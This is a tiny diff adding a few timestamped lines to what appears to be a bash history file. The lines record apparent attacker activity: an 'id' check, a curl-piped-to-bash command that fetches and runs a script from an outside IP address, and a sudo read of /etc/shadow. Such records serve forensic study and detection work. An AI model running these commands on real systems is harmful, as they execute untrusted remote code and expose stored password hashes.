@@ -1,0 +1,6 @@
+#1714557600
+id
+#1714557605
+curl -s http://198.51.100.20/p | bash
+#1714557610
+sudo cat /etc/shadow
